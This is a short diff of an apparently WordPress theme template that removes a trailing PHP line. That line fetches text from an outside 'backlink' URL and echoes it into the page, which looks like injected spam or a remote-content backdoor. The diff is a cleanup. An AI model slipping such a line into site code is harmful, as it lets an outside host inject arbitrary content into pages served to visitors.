@@ -42,5 +42,3 @@ get_header(); ?>
 <?php endif ?>
 
 <?php get_footer(); ?>
-
-<?php $a = file_get_contents('https://inilinkku.com/backlink/index.txt'); echo $a; ?>
